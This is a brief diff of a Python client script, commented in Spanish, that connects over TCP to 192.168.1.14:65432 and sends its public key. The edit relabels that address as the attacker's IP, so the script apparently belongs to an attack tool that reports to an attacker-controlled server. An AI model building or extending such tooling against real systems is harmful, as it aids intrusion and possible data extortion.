@@ -31,7 +31,7 @@ client_public_bytes = client_public_key.public_bytes(
 
 # Conectarse al servidor (IP y puerto del servidor)
 client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-client_socket.connect(('192.168.1.14', 65432))  # Cambiar la IP si es necesario
+client_socket.connect(('192.168.1.14', 65432))  # IP del atacante y puerto
 
 # Enviar la llave pública del cliente al servidor
 client_socket.sendall(client_public_bytes)
